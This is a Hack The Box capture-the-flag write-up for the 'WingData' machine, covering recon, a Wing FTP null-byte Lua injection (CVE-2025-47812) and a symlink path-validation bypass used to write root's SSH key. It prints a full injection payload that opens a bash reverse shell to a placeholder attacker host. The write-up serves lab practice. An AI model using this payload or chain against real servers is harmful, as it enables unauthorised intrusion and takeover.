# HTB WingData Writeup

**Machine:** WingData  
**Platform:** Hack The Box  
**Difficulty:** Easy  
**OS:** Linux  
**Status:** PWNED ✅  

---

# Recon

## Nmap Scan

```bash
nmap -sC -sV -p- -T4 <TARGET-IP>
```

### Output

```bash
22/tcp open  ssh     OpenSSH 9.2p1 Debian
80/tcp open  http    Apache httpd 2.4.66
```

### Key Findings

- SSH running on port 22
- Web server running on port 80
- Redirects to:

```bash
http://wingdata.htb
```

Add domain locally:

```bash
echo "<TARGET-IP> wingdata.htb" | sudo tee -a /etc/hosts
```

---

# Web Enumeration

Visiting:

```bash
http://wingdata.htb
```

Reveals a **Wing FTP dashboard**

Clicking client portal redirects to:

```bash
http://ftp.wingdata.htb
```

Add second virtual host:

```bash
echo "<TARGET-IP> ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

---

# Version Identification

Footer reveals:

```bash
Wing FTP Server v7.4.3
```

This version is vulnerable to:

**CVE-2025-47812**

---

# Initial Foothold — RCE

## Vulnerability Overview

Wing FTP stores session files as Lua scripts.

Example:

```lua
Session = {
 username = "admin",
 ip = "10.10.14.1"
}
```

These session files are later executed using:

```lua
dofile(session_file)
```

---

## Root Cause

Null byte injection allows breaking the Lua string.

Payload structure:

```bash
admin%00"]]..PAYLOAD..[["
```

This results in arbitrary Lua execution.

---

# Reverse Shell

Start listener:

```bash
nc -lvnp 4444
```

Exploit payload:

```bash
admin%00"]]..os.execute('bash -c "bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1"')..[["
```

Send malicious request via:

- Burp Suite
- curl
- custom Python script

Trigger session execution by visiting:

```bash
dir.html
```

---

# Initial Shell

Receive shell as:

```bash
wingftp
```

or

```bash
www-data
```

---

# Internal Enumeration

Check important directories:

```bash
/opt/wingftp/
/var/lib/wingftp/
```

Look for:

- config files
- databases
- hashes
- credentials

---

# Hash Discovery

Found user hash inside application files/database.

Extract hash and crack:

```bash
hashcat -m <mode> hash.txt rockyou.txt
```

Recovered credentials for local user.

---

# SSH Access

```bash
ssh user@<TARGET-IP>
```

Stable shell obtained.

---

# Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

or enumerate services:

```bash
ps aux
systemctl list-units
```

---

# Vulnerable Script Discovery

Found privileged script handling:

- backups
- file processing
- data extraction

---

# PATH_MAX Overflow (CVE-2025-4517)

The script uses:

```python
os.path.realpath()
```

to validate paths.

---

## Issue

Very long symlink chains can bypass validation.

This allows:

- Arbitrary file write
- Escaping intended directory restrictions

---

# Root Exploitation

Write SSH key into root account:

```bash
/root/.ssh/authorized_keys
```

Example:

```bash
echo "ATTACKER_PUBLIC_KEY" > /root/.ssh/authorized_keys
```

---

# Root Access

Login as root:

```bash
ssh root@<TARGET-IP> -i id_rsa
```

---

# Root Flag

```bash
cat /root/root.txt
```

---

# Attack Chain

```text
Nmap
 → Web Enumeration
 → ftp.wingdata.htb
 → Wing FTP v7.4.3
 → CVE-2025-47812
 → RCE
 → Reverse Shell
 → Hash Discovery
 → SSH Access
 → PATH_MAX Exploit
 → Arbitrary File Write
 → Root SSH Access
```

---

# Tools Used

- nmap
- ffuf
- Burp Suite
- curl
- hashcat
- ssh
- python
- netcat

---

# Lessons Learned

- Always check software versions
- Virtual hosts matter
- Session file handling can be dangerous
- Null byte injection is still relevant
- Internal enumeration wins privilege escalation
- Read scripts carefully during privesc

---

# Final Thoughts

This box was a great example of:

- Web exploitation
- RCE via unsafe serialization
- Credential pivoting
- Privilege escalation through file write abuse

The real lesson?

**Enumeration > random exploitation.**

Miss the version number → you miss the box.
